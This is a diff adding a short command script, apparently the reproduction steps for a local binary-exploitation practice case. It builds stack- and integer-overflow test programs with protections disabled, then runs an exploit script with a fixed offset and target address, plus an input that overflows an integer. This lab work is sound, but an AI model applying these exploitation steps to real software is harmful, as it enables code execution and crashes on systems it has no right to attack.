@@ -1,0 +1,8 @@
+# 在仓库根执行；全部命令已在 Windows 11 + MinGW gcc 15.2.0 实跑
+gcc -O0 -fno-stack-protector -no-pie -o Tool/cases/pwn-crypto03/artifacts/stack_overflow.exe Tool/cases/pwn-crypto03/input/stack_overflow.c
+gcc -O0 -fno-stack-protector -no-pie -o Tool/cases/pwn-crypto03/artifacts/int_overflow.exe Tool/cases/pwn-crypto03/input/int_overflow.c
+objdump -d Tool/cases/pwn-crypto03/artifacts/stack_overflow.exe > Tool/cases/pwn-crypto03/artifacts/stack_overflow.dis
+printf 'hello\n' | Tool/cases/pwn-crypto03/artifacts/stack_overflow.exe 2> Tool/cases/pwn-crypto03/artifacts/probe.txt
+python Tool/skill/pwn-crypto/scripts/pwn-repro.py --objdump Tool/cases/pwn-crypto03/artifacts/stack_overflow.dis --func vuln --probe-log Tool/cases/pwn-crypto03/artifacts/probe.txt
+python Tool/cases/pwn-crypto03/input/exploit_stack.py --bin Tool/cases/pwn-crypto03/artifacts/stack_overflow.exe --offset 88 --win 0x140001440
+echo 1073741825 | Tool/cases/pwn-crypto03/artifacts/int_overflow.exe   # rc 原始 NTSTATUS 0xC0000374
